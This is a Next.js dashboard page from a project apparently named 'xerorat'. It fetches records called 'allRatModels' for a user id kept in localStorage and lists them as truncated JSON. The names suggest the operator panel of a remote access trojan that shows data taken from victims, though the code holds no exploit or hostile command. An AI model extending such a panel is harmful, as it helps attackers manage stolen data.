'use client'
import React, { useEffect, useState } from 'react';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { atomDark } from 'react-syntax-highlighter/dist/esm/styles/prism';
import SMSCards from '@/components/SMSCard';
import { useRouter } from 'next/navigation';

function DataPage() {
    const [data, setData] = useState([]);
    const xerorat_user_id = typeof localStorage !== 'undefined' ? localStorage.getItem('xerorat_user_id') : null; // Get the user_id from localStorage

    useEffect(() => {
        const getData = async () => {
            try {
                const timestamp = Date.now();
                const response = await fetch('/api/getData', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ user_id: xerorat_user_id, timestamp }),
                });

                const responseData = await response.json();

                setData(responseData.allRatModels);
            } catch (error) {
                setData('An error occurred');
            }
        }

        getData();
    }, [xerorat_user_id]);

    const router = useRouter();

    const viewDetails = (id) => {
        console.log(id);
        router.push('/dashboard/details/' + id);
    }

    const handleLogout = () => {
        // Implement your logout logic here, e.g., clearing user data from local storage and redirecting to the login page.
        localStorage.removeItem('xerorat_user_id');
        router.push('/auth/login'); // Redirect to the login page
    }

    return (
        <div className="flex flex-col justify-center items-center h-screen bg-gray-900">
            {/* Log Out Button */}
            <button onClick={handleLogout} className="absolute top-4 right-4 bg-red-500 text-white p-2 rounded-md cursor-pointer">Log Out</button>

            <div className="w-4/5 max-w-screen-md m-4 p-4 bg-gray-800 rounded-lg shadow-md overflow-y-auto max-h-screen">
                {data.map((item, index) => (
                    <div key={index} className={`mb-4`}>
                        <button onClick={() => viewDetails(item._id)}>
                            <SyntaxHighlighter language="json" style={atomDark}>
                                {JSON.stringify(item, null, 2).slice(0, 400)}
                            </SyntaxHighlighter>
                        </button>
                    </div>
                ))}
            </div>
        </div>
    );
}

export default DataPage;
